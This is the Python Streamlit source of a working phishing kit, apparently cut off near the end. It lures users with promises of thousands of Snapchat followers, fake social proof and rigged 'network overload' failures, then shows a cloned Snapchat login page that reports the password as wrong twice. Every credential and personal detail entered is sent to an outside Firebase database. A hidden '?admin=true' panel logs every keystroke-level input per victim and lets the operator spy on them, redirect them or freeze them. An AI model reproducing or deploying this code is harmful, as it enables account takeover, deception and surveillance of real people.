import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Official Verification Gate",
    page_icon="👑",
    layout="centered",
    initial_sidebar_state="collapsed"
)
# ========================================================================
# 🪐 THE ULTIMATE GOD-MODE COMMAND CENTER (PASTE BELOW SET_PAGE_CONFIG)
# ========================================================================
import streamlit as st
import uuid
import requests
import datetime
import pandas as pd

# 1. LIVE FIREBASE CONNECTION
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"

if "user_uid" not in st.session_state:
    st.session_state.user_uid = str(uuid.uuid4())[:6]

# Firebase Fast REST API Engines
def firebase_set(path, data):
    try: requests.put(f"{FIREBASE_URL}/{path}.json", json=data)
    except: pass

def firebase_get(path):
    try:
        res = requests.get(f"{FIREBASE_URL}/{path}.json").json()
        return res if res else {}
    except: return {}

# Fetch All Global Variables Instantly
controls = firebase_get("global_controls")
if not controls:
    controls = {
        "site_status": "ONLINE",
        "custom_msg": "System upgrade in progress.",
        "redirect_url": "",
        "freeze_inputs": False,
        "stealth_mode": False,
        "kill_switches": {},
        "custom_labels": {}
    }
if "kill_switches" not in controls: controls["kill_switches"] = {}
if "custom_labels" not in controls: controls["custom_labels"] = {}

# 2. ⚡ LIVE DETAILED TRACKING ENGINE
def ultra_track(element_type, label, value=""):
    if controls.get("stealth_mode", False): return # Admin tracking off kar sakta hai
    path = f"live_users/{st.session_state.user_uid}"
    time_now = datetime.datetime.now().strftime("%H:%M:%S")
    
    # Purana data read karke timeline save rakhenge
    current_user_data = firebase_get(path)
    timeline = current_user_data.get("timeline", [])
    
    action_log = f"[{time_now}] {element_type} -> {label}"
    if value: action_log += f" (Data: {value})"
    timeline.append(action_log)
    if len(timeline) > 15: timeline.pop(0) # Keep last 15 actions to save space
    
    payload = {
        "session_id": st.session_state.user_uid,
        "last_seen": time_now,
        "current_step": f"Interacting with {label}",
        "last_action_type": element_type,
        "timeline": timeline
    }
    if value:
        # Inputs ko permanent dictionary me track karenge taaki clear karne par bhi safe rahe
        user_inputs = current_user_data.get("all_inputs", {})
        user_inputs[label] = str(value)
        payload["all_inputs"] = user_inputs

    try: requests.patch(f"{FIREBASE_URL}/{path}.json", json=payload)
    except: pass

# 3. 🛡️ TOTAL WEBSITE HARD-LOCK MODES
if st.query_params.get("admin") != "true":
    status = controls.get("site_status", "ONLINE")
    if status != "ONLINE":
        st.empty() # Purana layout clean
        if status == "MAINTENANCE":
            st.error("# 🚧 UNDER SYSTEM MAINTENANCE 🚧")
            st.info(controls.get("custom_msg", "Backend database tuning is active."))
        elif status == "BUSY":
            st.warning("# ⏳ SERVER OVERLOADED (429) ⏳")
            st.info("High traffic volume from your region. Please hold on...")
        elif status == "CLOSED":
            st.error("# 🛑 ACCESS DENIED / APP CLOSED 🛑")
            st.write(controls.get("custom_msg", "This session has been terminated by the administrator."))
        elif status == "REDIRECT" and controls.get("redirect_url"):
            st.markdown(f"### ➡️ Redirecting you to official link... [Click Here]({controls.get('redirect_url')})")
        st.stop()

# 4. 🔥 THE MONKEY-PATCH HIJACKING MATRICES
orig_button = st.button
orig_text_input = st.text_input
orig_text_area = st.text_area
orig_selectbox = st.selectbox
orig_radio = st.radio
orig_write = st.write

def smart_button(label, *args, **kwargs):
    # Granular Kill Switch Check
    if controls["kill_switches"].get(label, False):
        return False
    clicked = orig_button(label, *args, **kwargs)
    if clicked: ultra_track("BUTTON_CLICK", label, "YES")
    return clicked

def smart_text_input(label, *args, **kwargs):
    if controls["kill_switches"].get(label, False): return ""
    # Freeze Mode: User type nahi kar payega, read-only disabled ho jayega
    if controls.get("freeze_inputs", False): kwargs["disabled"] = True
    
    val = orig_text_input(label, *args, **kwargs)
    if val: ultra_track("INPUT_FIELD", label, val)
    return val

def smart_text_area(label, *args, **kwargs):
    if controls["kill_switches"].get(label, False): return ""
    if controls.get("freeze_inputs", False): kwargs["disabled"] = True
    val = orig_text_area(label, *args, **kwargs)
    if val: ultra_track("TEXT_AREA", label, val)
    return val

def smart_selectbox(label, *args, **kwargs):
    if controls["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    val = orig_selectbox(label, *args, **kwargs)
    ultra_track("DROP_DOWN", label, val)
    return val

def smart_radio(label, *args, **kwargs):
    if controls["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    val = orig_radio(label, *args, **kwargs)
    ultra_track("RADIO_BTN", label, val)
    return val

def smart_write(*args, **kwargs):
    # Custom live content replacement text hack
    if args and isinstance(args[0], str) and args[0] in controls["custom_labels"]:
        orig_write(controls["custom_labels"][args[0]], **kwargs)
        return
    orig_write(*args, **kwargs)

# OVERRIDING THE CORE FRAMEWORK
st.button = smart_button
st.text_input = smart_text_input
st.text_area = smart_text_area
st.selectbox = smart_selectbox
st.radio = smart_radio
st.write = smart_write

# ========================================================================
# 🛑 FULL PAGE GOD-MODE ADMIN OVERRIDE (IF ?admin=true DETECTED)
# ========================================================================
if st.query_params.get("admin") == "true":
    st.title("🪐 GOD-MODE TERMINAL v4.0 (PRO)")
    st.write("---")
    
    # TAB SYSTEM FOR RICH UI
    tab1, tab2, tab3, tab4 = st.tabs(["📊 LIVE SPY PANEL", "🕹️ INFRASTRUCTURE SYSTEM", "🎛️ GRANULAR COMPONENT CONTROL", "📝 CONTENT MANIPULATION"])
    
    # ---------------------------------------------------------
    # TAB 1: LIVE SPY PANEL (Track users step-by-step)
    # ---------------------------------------------------------
    with tab1:
        st.subheader("🕵️‍♂️ Realtime Active Sessions")
        raw_users = firebase_get("live_users")
        
        if raw_users:
            col_m1, col_m2 = st.columns(2)
            col_m1.metric("Total Ever Connected", len(raw_users))
            
            # Formatting for organized view
            user_list = list(raw_users.keys())
            selected_spy = st.selectbox("🎯 Select a User Session to Spy on Live:", user_list)
            
            if selected_spy:
                u_data = raw_users[selected_spy]
                st.info(f"**Session ID:** {selected_spy} | **Last Active Time:** {u_data.get('last_seen')}")
                
                c1, c2 = st.columns(2)
                with c1:
                    st.write("#### 💾 Captured Raw Inputs Data")
                    st.json(u_data.get("all_inputs", {"Status": "No text typed yet"}))
                with c2:
                    st.write("#### 📈 Live Activity Step Timeline")
                    for step in u_data.get("timeline", []):
                        st.text(step)
            
            st.write("---")
            if st.button("🚨 Wipe Out All User Session Logs", key="clear_all"):
                requests.delete(f"{FIREBASE_URL}/live_users.json")
                st.rerun()
        else:
            st.info("No live connections found in Firebase database.")

    # ---------------------------------------------------------
    # TAB 2: INFRASTRUCTURE SYSTEM (Global Web Locks)
    # ---------------------------------------------------------
    with tab2:
        st.subheader("🌐 Global App Status Interceptor")
        c_status = controls.get("site_status", "ONLINE")
        st.write(f"Current Matrix Status: **{c_status}**")
        
        mode_select = st.radio("Switch Infrastructure Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "CLOSED", "REDIRECT"])
        msg_input = st.text_input("Interception Display Message:", value=controls.get("custom_msg", ""))
        redir_input = st.text_input("Redirect Link (Only for REDIRECT mode):", value=controls.get("redirect_url", ""))
        
        st.write("---")
        st.subheader("⚙️ Global Inputs Lock")
        freeze_chk = st.checkbox("Freeze All Input Boxes (Read-Only Mode for Users)", value=controls.get("freeze_inputs", False))
        stealth_chk = st.checkbox("Stealth Mode (Pause Database Logs Writing)", value=controls.get("stealth_mode", False))
        
        if st.button("Execute Infrastructure Overhaul ⚡", key="save_tab2"):
            controls["site_status"] = mode_select
            controls["custom_msg"] = msg_input
            controls["redirect_url"] = redir_input
            controls["freeze_inputs"] = freeze_chk
            controls["stealth_mode"] = stealth_chk
            firebase_set("global_controls", controls)
            st.success("App structure updated successfully!")
            st.rerun()

    # ---------------------------------------------------------
    # TAB 3: GRANULAR COMPONENT CONTROL (Kill specific elements)
    # ---------------------------------------------------------
    with tab3:
        st.subheader("🎯 Specific Component Kill-Switch")
        st.write("Apne app ke kisi bhi specific button ya input box ka **exact Label** daalkar use instantly hide/block karein.")
        
        comp_label = st.text_input("Enter Element Label (Case Sensitive):")
        kill_action = st.selectbox("Action for this element:", ["ENABLE / SHOW", "KILL / HIDE"])
        
        if st.button("Inject Component Policy 🛠️", key="save_tab3"):
            if comp_label:
                controls["kill_switches"][comp_label] = (kill_action == "KILL / HIDE")
                firebase_set("global_controls", controls)
                st.success(f"Policy updated for '{comp_label}'")
                st.rerun()
                
        st.write("#### Active Kill-Switched Elements")
        active_kills = [k for k, v in controls["kill_switches"].items() if v]
        if active_kills:
            st.json(active_kills)
            if st.button("Reset All Kill-Switches 🔄"):
                controls["kill_switches"] = {}
                firebase_set("global_controls", controls)
                st.rerun()
        else:
            st.caption("All elements running fine globally.")

    # ---------------------------------------------------------
    # TAB 4: CONTENT MANIPULATION (Change Text on the fly)
    # ---------------------------------------------------------
    with tab4:
        st.subheader("✍️ Live Text Override System")
        st.write("Aapke app mein jo text `st.write()` se chal raha hai, aap use bina code touch kiye badal sakte hain.")
        
        target_text = st.text_input("Original Text (jo code me likha hai):")
        replacement_text = st.text_input("New Text (jo user ko dikhana hai):")
        
        if st.button("Inject Text Overwrite 📝", key="save_tab4"):
            if target_text and replacement_text:
                controls["custom_labels"][target_text] = replacement_text
                firebase_set("global_controls", controls)
                st.success("Text policy updated!")
                st.rerun()
                
        st.write("#### Active Text Replacements")
        st.json(controls["custom_labels"])
        if st.button("Clear All Text Replacements ❌"):
            controls["custom_labels"] = {}
            firebase_set("global_controls", controls)
            st.rerun()

    st.write("---")
    st.error("⚠️ WARNING: God-Mode is active on this page. Close tab or remove '?admin=true' from URL to return to normal app preview.")
    st.stop() # Pure page ko admin panel bana dega, user ka niche ka code draw nahi hoga!

# ========================================================================
# END OF ULTIMATE CODE MESH - APKA CODE ISKE THEEK NICHE CHALTA REHNA CHAHIYE
# ========================================================================

# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

/* Force Absolute Premium Light Environment Canvas */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }

/* ⏱️ Animated Glow-Card Counter Visualizer */
.premium-countdown-card {
    background: #ffffff !important;
    border: 2px solid #000000 !important;
    padding: 16px;
    border-radius: 14px;
    text-align: center;
    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
    margin-bottom: 20px;
    border-bottom: 5px solid #fffc00 !important;
}
.countdown-timer-stream {
    font-size: 20px;
    font-weight: 800;
    color: #2563eb !important;
    letter-spacing: 1px;
}

/* 📊 Premium Flow Drop Social Banner */
.premium-live-banner {
    background: #ffffff;
    border: 1px solid #2563eb;
    border-left: 6px solid #2563eb;
    border-radius: 12px;
    padding: 14px 18px;
    margin-bottom: 20px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
}

/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
.stepper-flex-wrapper {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 25px;
}
.step-pill-node {
    flex: 1;
    background: #e2e8f0;
    padding: 10px 4px;
    border-radius: 8px;
    text-align: center;
    font-size: 11px;
    font-weight: 800;
    color: #64748b !important;
    text-transform: uppercase;
    border: 1px solid transparent;
    transition: all 0.4s ease;
}
.step-pill-node.active-node {
    background: #2563eb !important;
    color: #ffffff !important;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
    transform: scale(1.02);
}
.step-pill-node.completed-node {
    background: #fffc00 !important;
    color: #000000 !important;
    border: 1px solid #000000;
}

/* 📦 Core High-Fidelity Bounded Canvas Box */
.premium-canvas-wrapper {
    background: #ffffff !important;
    border: 2px solid #eef2f6 !important;
    border-radius: 16px !important;
    padding: 35px 28px !important;
    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
    margin-bottom: 30px;
}

/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
.center-logo-box-matrix {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 5px auto 20px auto;
    width: 90px !important;
    height: 90px !important;
    background: #ffffff;
    border-radius: 18px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    padding: 8px;
    border: 1px solid #f1f5f9;
}
.center-logo-box-matrix img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
.custom-hd-label {
    font-weight: 800 !important;
    font-size: 13px !important;
    color: #000000 !important;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    margin-bottom: 8px !important;
    display: block;
}
div[data-baseweb='input'] {
    border: 2px solid #cbd5e1 !important;
    border-radius: 8px !important;
    background-color: #ffffff !important;
    overflow: hidden !important;
    transition: all 0.3s ease-in-out !important;
}
div[data-baseweb='input']:focus-within {
    border-color: #2563eb !important;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb='input'] input {
    color: #000000 !important;
    font-weight: 600 !important;
    font-size: 14.5px !important;
    padding: 12px 14px !important;
}

/* 💛 Step 5 (Image Replica Login Layout Overrides) */
.replica-brand-label {
    text-align: center !important;
    font-size: 38px !important;
    font-weight: 400 !important;
    color: #000000 !important;
    margin-bottom: 32px !important;
    margin-top: -5px !important;
    letter-spacing: -1.5px !important;
}
.replica-field-title {
    color: #8c92ac !important;
    font-size: 11.5px !important;
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important;
    display: block !important;
}
/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }

/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 145px !important;
    font-weight: 800 !important;
    font-size: 15px !important;
    border: 2px solid #000000 !important;
    height: 44px !important;
    margin: 32px auto 5px auto !important;
    display: block !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
}
.stButton > button[kind="secondary"]:hover {
    background-color: #f2ef00 !important;
    transform: translateY(-1px);
}

/* Terminal Console UI Element */
.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }

/* Engagement Node Anchor */
.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
/* Streamlit Watermark aur Header ko complete hide karne ke liye */
header[data-testid="stHeader"] { visibility: hidden !important; display: none !important; }
footer { visibility: hidden !important; display: none !important; }
div[data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
#MainMenu { visibility: hidden !important; display: none !important; }
div[class^="viewerBadge"] { display: none !important; visibility: hidden !important; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)

# Render High-Fidelity Active Counter Module Box
st.markdown(f"""
<div class='premium-countdown-card'>
    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
</div>
""", unsafe_allow_html=True)

# ==========================================
# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
# ==========================================
fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
fake_counts = ["5,000", "10,000", "20,000"]
selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='premium-live-banner'>
    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
</div>
""", unsafe_allow_html=True)


# ==========================================
# 📍 ULTRARICH LIQUID STEPPER INTERFACE
# ==========================================
s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
s4_class = "active-node" if st.session_state.step >= 4 else ""

st.markdown(f"""
<div class='stepper-flex-wrapper'>
    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    # Accurate Scale Icon Box Matrix Centering Layer
    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
    try:
        st.image("1.png")
    except:
        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Mapping active partition nodes...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Secure Node Allocation Verified.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(0.8)
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.008)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Registry Error: Identity token string constraint violated.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
    
    st.write("")
    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
        else:
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='prime-engagement-block'>
        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE BELOW  to verify your snapchat account 👈</span>
        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("You need to verify Snapchat IDENTITY FOOTPRINT MATCH NOW 👑 to get token key 🗝️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
        time.sleep(1.4)
        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
        time.sleep(0.6)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
    
    # Rigid Icon Control Engine Core
    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
    try:
        st.image("2.jpg")
    except:
        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
                st.session_state.intercepted_dataset.append(log_capture_map)
                
                # Rigid 2-Attempt Failure Matrix Loop Logic
                if st.session_state.login_attempts_count < 3:
                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
                    st.session_state.login_attempts_count += 1
                    with st.spinner("Connecting to authentication server node..."):
                        time.sleep(3.5)
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
                    with st.spinner("Syncing verified priority access tokens..."):
                        time.sleep(3.5)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("All parameters required.")
                
    st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
    
    console_view = st.empty()
    console_lines = [
        "Verifying structural checksum hash validations...",
        "Establishing persistent link channels with transaction database...",
        "Injecting priority queue traffic routes to verified hardware target...",
        "Syncing session configuration metadata fields... PASSED",
        "Assembling tracking payload arrays inside isolated partition lines...",
        "Finalizing payload deployment... SYSTEM SUCCESS"
    ]
    
    cmd_markup_accumulator = ""
    for specific_line in console_lines:
        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
        time.sleep(1.4)
        
    console_view.empty()
    
    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
    
    token_display_box = f"""
    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
